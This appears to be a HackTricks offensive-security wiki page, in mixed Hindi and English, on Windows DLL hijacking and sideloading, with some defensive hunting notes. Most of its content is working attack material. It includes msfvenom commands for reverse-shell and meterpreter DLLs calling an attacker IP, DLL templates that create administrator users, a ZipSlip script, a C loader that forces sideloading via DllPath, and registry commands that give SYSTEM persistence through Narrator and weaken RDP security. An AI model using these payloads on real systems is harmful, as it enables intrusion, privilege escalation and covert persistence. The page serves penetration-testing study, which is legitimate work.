# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking में एक trusted application को manipulate करके एक malicious DLL load कराना शामिल है। यह term कई tactics को cover करती है, जैसे **DLL Spoofing, Injection, और Side-Loading**। इसका मुख्य उपयोग code execution, persistence हासिल करने, और कम बार privilege escalation के लिए होता है। हालाँकि यहाँ escalation पर focus है, hijacking का तरीका objectives के बीच consistent रहता है।

### Common Techniques

DLL hijacking के लिए कई methods इस्तेमाल किए जाते हैं, और उनकी effectiveness application की DLL loading strategy पर निर्भर करती है:

1. **DLL Replacement**: एक genuine DLL को malicious DLL से बदलना, और चाहें तो original DLL की functionality बनाए रखने के लिए DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: malicious DLL को search path में legitimate DLL से पहले रखना, और application के search pattern का exploit करना।
3. **Phantom DLL Hijacking**: application के लिए एक malicious DLL बनाना, ताकि वह उसे एक non-existent required DLL समझकर load करे।
4. **DLL Redirection**: `%PATH%` या `.exe.manifest` / `.exe.local` files जैसे search parameters को modify करके application को malicious DLL की ओर redirect करना।
5. **WinSxS DLL Replacement**: WinSxS directory में legitimate DLL को उसके malicious counterpart से बदलना, यह method अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को user-controlled directory में copied application के साथ रखना, जो Binary Proxy Execution techniques जैसा दिखता है।


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading ही trusted **.NET Framework** process को attacker code load कराने का एकमात्र तरीका नहीं है। अगर target executable एक **managed** application है, तो CLR executable के नाम वाली एक **application configuration file** भी देखता है (उदाहरण के लिए `Setup.exe.config`)। वह file एक custom **AppDomainManager** define कर सकती है। अगर config attacker-controlled assembly की ओर point करती है जो EXE के साथ रखी हो, तो CLR उसे application के normal code path से **पहले** load करता है और trusted process के अंदर run करता है।

Microsoft के .NET Framework configuration schema के अनुसार, custom manager इस्तेमाल करने के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों present होने चाहिए।

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
न्यूनतम manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
व्यावहारिक नोट्स:
- यह **.NET Framework specific** tradecraft है। यह CLR config parsing पर निर्भर करता है, Win32 DLL search order पर नहीं।
- host वास्तव में एक **managed EXE** होना चाहिए। जल्दी जाँच: `sigcheck -m target.exe`, `corflags target.exe`, या PE metadata में **CLR Runtime Header** देखें।
- config filename executable name से बिल्कुल match होना चाहिए (`<binary>.config`) और आमतौर पर **EXE के पास** रहता है।
- यह **signed Microsoft/vendor binaries** के साथ उपयोगी है क्योंकि trusted EXE untouched रहता है जबकि malicious managed assembly in-process execute होती है।
- अगर आपके पास पहले से writable installer/update directory है, तो AppDomainManager hijacking को **first stage** के रूप में इस्तेमाल किया जा सकता है, और बाद के stages के लिए classic DLL sideloading या reflective loading किया जा सकता है।

### मौजूदा scheduled task को hijack करके sideload chain फिर से शुरू करना

persistence के लिए, सिर्फ **creating a new task** पर न देखें। कुछ intrusion sets तब तक wait करते हैं जब तक कोई legitimate installer एक **normal updater task** create न कर दे, और फिर **task action को rewrite** करते हैं ताकि existing name, author, और trigger defenders को familiar लगे।

Reusable workflow:
1. legitimate software install/run करें और वह task पहचानें जो वह normally बनाता है।
2. task XML export करें और current `<Exec><Command>` / `<Arguments>` values नोट करें।
3. सिर्फ action बदलें ताकि task आपकी **trusted host EXE** को user-writable staging directory से start करे, जो फिर real payload को side-load या AppDomain-load करता है।
4. नया obvious persistence artifact बनाने के बजाय same task name को फिर से register करें।
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Why it is stealthier:
- The task name can still look legitimate (for example a vendor updater).
- The **Task Scheduler service** launches it, so parent/ancestor validation often sees the expected scheduling chain instead of `explorer.exe`.
- DFIR teams that only hunt for **new task names** may miss a task whose registration already existed but whose action now points to `%LOCALAPPDATA%`, `%APPDATA%`, or another attacker-controlled path.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

and just show the **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" `<exec name>`, execute it, and stop capturing events**.

## Exploiting Missing Dlls

In order to escalate privileges, the best chance we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the folder where the **original dll** is (weird case), or we will be able to **write on some folder where the dll is going to be searched** and the original **dll doesn't exist** on any folder.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** look for DLLs by following a set of **pre-defined search paths**, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).

There are other ways to alter the ways to alter the search order but I'm not going to explain them here.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Archive ko watched inbox/share me deliver karein; jab scheduled task process ko re-launch karta hai, to woh malicious DLL load karta hai aur service account ke under aapka code execute karta hai.

### RTL_USER_PROCESS_PARAMETERS.DllPath ke through sideloading force karna

Newly created process ke DLL search path ko deterministically influence karne ka ek advanced tareeqa hai process create karte waqt ntdll ke native APIs ke saath RTL_USER_PROCESS_PARAMETERS me DllPath field set karna. Yahan attacker-controlled directory provide karke, ek target process jo kisi imported DLL ko naam se resolve karta hai (no absolute path aur safe loading flags use nahi karta) ko force kiya ja sakta hai ki woh us directory se malicious DLL load kare.

Key idea
- RtlCreateProcessParametersEx ke saath process parameters build karein aur ek custom DllPath dein jo aapke controlled folder ki taraf point kare (jaise directory jahan aapka dropper/unpacker live hai).
- RtlCreateUserProcess se process create karein. Jab target binary kisi DLL ko naam se resolve karta hai, loader resolution ke dauran is supplied DllPath ko consult karega, jisse reliable sideloading enable hoti hai, even when malicious DLL target EXE ke saath colocated nahi hoti.

Notes/limitations
- Iska effect create kiye ja rahe child process par hota hai; yeh SetDllDirectory se different hai, jo sirf current process ko affect karta hai.
- Target ko DLL ko naam se import ya LoadLibrary karna chahiye (no absolute path aur LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories use nahi karna chahiye).
- KnownDLLs aur hardcoded absolute paths hijack nahi kiye ja sakte. Forwarded exports aur SxS precedence change kar sakte hain.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (ज़रूरी functions export करके या real one को proxy करके)।
- ऊपर वाली technique का उपयोग करके एक signed binary लॉन्च करें जो नाम से xmllite.dll खोजने के लिए जाना जाता है। loader, दिए गए DllPath के माध्यम से import resolve करता है और आपकी DLL को sideload करता है।

यह technique in-the-wild में multi-stage sideloading chains चलाने के लिए देखी गई है: एक initial launcher एक helper DLL drop करता है, जो फिर एक Microsoft-signed, hijackable binary को custom DllPath के साथ spawn करता है ताकि attacker की DLL को staging directory से load किया जा सके।


#### Windows docs में dll search order पर exceptions

Windows documentation में standard DLL search order के कुछ exceptions बताए गए हैं:

- जब **ऐसी DLL जिसका नाम पहले से memory में loaded किसी DLL से मिलता-जुलता हो** encounter होती है, तो system usual search को bypass करता है। इसके बजाय, defaulting to the DLL already in memory से पहले redirection और manifest के लिए check करता है। **इस scenario में, system DLL के लिए search नहीं करता**।
- अगर DLL current Windows version के लिए **known DLL** के रूप में recognized होती है, तो system अपने known DLL version का use करेगा, साथ ही उसकी dependent DLLs का भी, और **search process को छोड़ देगा**। registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** में इन known DLLs की list होती है।
- अगर किसी **DLL की dependencies** हों, तो इन dependent DLLs के लिए search ऐसे की जाती है मानो वे केवल अपने **module names** से indicate की गई हों, चाहे initial DLL को full path से ही क्यों न identify किया गया हो।

### Escalating Privileges

**Requirements**:

- ऐसे process की पहचान करें जो **different privileges** के तहत operate करता हो या करेगा (horizontal या lateral movement), और जिसमें **DLL** missing हो।
- सुनिश्चित करें कि किसी भी **directory** के लिए **write access** उपलब्ध हो जिसमें **DLL** को **search** किया जाएगा। यह location executable की directory या system path के अंदर कोई directory हो सकती है।

हाँ, ये requisites ढूँढना मुश्किल है क्योंकि **by default एक privileged executable का dll missing होना थोड़ा अजीब होता है** और **system path folder पर write permissions होना उससे भी ज़्यादा अजीब है** (default रूप से नहीं होता)। लेकिन misconfigured environments में यह संभव है।\
अगर आप lucky हैं और requirements पूरी हो जाती हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) project देख सकते हैं। भले ही project का **main goal UAC bypass करना** है, वहाँ आपको Windows version के लिए **Dll hijaking** का कोई **PoC** मिल सकता है जिसे आप use कर सकते हैं (शायद बस उस folder का path बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप किसी folder में **अपनी permissions check** कर सकते हैं:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी folders की permissions जांचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप executable के imports और dll के exports को भी इस तरह check कर सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)यह जांच करेगा कि क्या आपके पास system PATH के अंदर किसी भी folder पर write permissions हैं।\
वulnerability को खोजने के लिए अन्य interesting automated tools हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

अगर आपको कोई exploitable scenario मिलता है, तो उसे successfully exploit करने के लिए सबसे important चीजों में से एक होगी **एक ऐसा dll create करना जो कम से कम वे सभी functions export करे जिन्हें executable उससे import करेगा**। Anyway, ध्यान दें कि Dll Hijacking **Medium Integrity level से High **(bypassing UAC)** तक escalate करने** के लिए [**bypassing UAC**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) तक पहुंचने में useful है। आप **valid dll कैसे create करें** इसका example इस dll hijacking study में पा सकते हैं जो execution के लिए dll hijacking पर focused है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **next section** में आपको कुछ **basic dll codes** मिलेंगे जो **templates** के रूप में या **non required functions exported** वाली **dll** बनाने के लिए useful हो सकते हैं।

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically एक **Dll proxy** ऐसी Dll है जो load होने पर **आपका malicious code execute** कर सकती है, लेकिन साथ ही **real library** को सभी calls relay करके **expose** और **work** भी कर सकती है जैसा expected है।

Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) के साथ आप वास्तव में **एक executable indicate** कर सकते हैं और **library select** कर सकते हैं जिसे आप proxify करना चाहते हैं और **proxified dll generate** कर सकते हैं, या **Dll indicate** करके **proxified dll generate** कर सकते हैं।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**मीटरप्रेटर (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक user बनाएं (x86 मुझे x64 version नहीं मिला):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### आपका अपना

ध्यान दें कि कई मामलों में जिस Dll को आप compile करते हैं, उसे **कई functions export** करने होंगे जिन्हें victim process द्वारा load किया जाएगा, अगर ये functions मौजूद नहीं हैं तो **binary उन्हें load नहीं कर पाएगी** और **exploit fail** हो जाएगा।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>यूज़र क्रिएशन के साथ C++ DLL example</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>थ्रेड एंट्री वाला वैकल्पिक C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अभी भी स्टार्ट पर एक predictable, language-specific localization DLL को probe करता है, जिसे arbitrary code execution और persistence के लिए hijack किया जा सकता है।

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- अगर OneCore path पर एक writable attacker-controlled DLL मौजूद हो, तो उसे load किया जाता है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी exports की आवश्यकता नहीं है।

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए path के attempted load को observe करें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. Quiet रहने के लिए, attach पर Narrator threads enumerate करें, main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) खोलें और `SuspendThread` करें; अपनी own thread में continue करें। Full code के लिए PoC देखें।

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर के साथ, Narrator start करने पर planted DLL load होती है। secure desktop (logon screen) पर, Narrator start करने के लिए CTRL+WIN+ENTER press करें; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।

RDP-triggered SYSTEM execution (lateral movement)
- Classic RDP security layer allow करें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host पर RDP करें, logon screen पर CTRL+WIN+ENTER press करके Narrator launch करें; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।
- RDP session close होते ही execution रुक जाती है—promptly inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator) clone कर सकते हैं, उसे edit करके arbitrary binary/DLL की ओर point करा सकते हैं, import कर सकते हैं, फिर `configuration` को उस AT name पर set कर सकते हैं। यह Accessibility framework के तहत arbitrary execution proxy करता है।

Notes
- `%windir%\System32` के नीचे write करना और HKLM values बदलना admin rights मांगता है।
- सारा payload logic `DLL_PROCESS_ATTACH` में रह सकता है; किसी export की जरूरत नहीं है।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

यह case Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** दिखाता है, जिसे **CVE-2025-1729** के रूप में tracked किया गया है।

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` logged-on user context के तहत daily 9:30 AM पर run होता है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable, जिससे local users arbitrary files drop कर सकते हैं।
- **DLL Search Behavior**: पहले अपनी working directory से `hostfxr.dll` load करने की कोशिश करता है और missing होने पर "NAME NOT FOUND" log करता है, जो local directory search precedence दिखाता है।

### Exploit Implementation

एक attacker उसी directory में malicious `hostfxr.dll` stub रख सकता है, missing DLL का फायदा उठाकर user के context में code execution हासिल कर सकता है:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. एक standard user के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में drop करें।
2. scheduled task के 9:30 AM पर current user's context में run होने का wait करें।
3. अगर task execute होने पर कोई administrator logged in है, तो malicious DLL administrator की session में medium integrity पर run होगी।
4. medium integrity से SYSTEM privileges तक elevate करने के लिए standard UAC bypass techniques chain करें।

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors अक्सर MSI-based droppers को DLL side-loading के साथ pair करते हैं ताकि payloads trusted, signed process के तहत execute हों।

Chain overview
- User MSI download करता है। एक CustomAction GUI install के दौरान silently run होती है (जैसे LaunchApplication या VBScript action), embedded resources से next stage को reconstruct करती है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को same directory में लिखता है (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE start होता है, Windows DLL search order पहले working directory से wsc.dll load करता है, और attacker code signed parent के under execute होता है (ATT&CK T1574.001)।

MSI analysis (what to look for)
- CustomAction table:
- ऐसे entries देखें जो executables या VBScript run करते हैं। Example suspicious pattern: LaunchApplication जो background में embedded file execute करता है।
- Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables inspect करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- या lessmsi उपयोग करें: lessmsi x package.msi C:\out
- ऐसे multiple small fragments खोजें जिन्हें VBScript CustomAction द्वारा concatenate और decrypt किया गया हो। Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- इन दो फ़ाइलों को एक ही folder में drop करें:
- wsc_proxy.exe: legitimate signed host (Avast). यह process अपनी directory से नाम के आधार पर wsc.dll load करने की कोशिश करता है।
- wsc.dll: attacker DLL. अगर किसी specific exports की जरूरत नहीं है, तो DllMain पर्याप्त हो सकता है; otherwise, एक proxy DLL बनाएं और required exports को genuine library पर forward करें, जबकि payload को DllMain में run करें।
- एक minimal DLL payload build करें:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export requirements के लिए, proxying framework (जैसे DLLirant/Spartacus) का उपयोग करें ताकि एक forwarding DLL बनाई जा सके जो साथ ही आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। अगर host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack fail हो सकता है।
- KnownDLLs, SxS, और forwarded exports precedence को प्रभावित कर सकते हैं और host binary तथा export set चुनते समय इन्हें ध्यान में रखना चाहिए।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon कैसे ShadowPad को deploy करता है, इसके लिए एक **three-file triad** का इस्तेमाल करके legitimate software जैसा blend किया जाता है, जबकि core payload disk पर encrypted रहता है:

1. **Signed host EXE** – AMD, Realtek, या NVIDIA जैसे vendors का abuse किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers executable का नाम बदलकर इसे Windows binary जैसा दिखाते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature valid रहती है।
2. **Malicious loader DLL** – EXE के साथ expected name से drop किया जाता है (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL आमतौर पर ScatterBrain framework से obfuscated एक MFC binary होती है; इसका एकमात्र काम encrypted blob को locate करना, उसे decrypt करना, और reflectively ShadowPad map करना होता है।
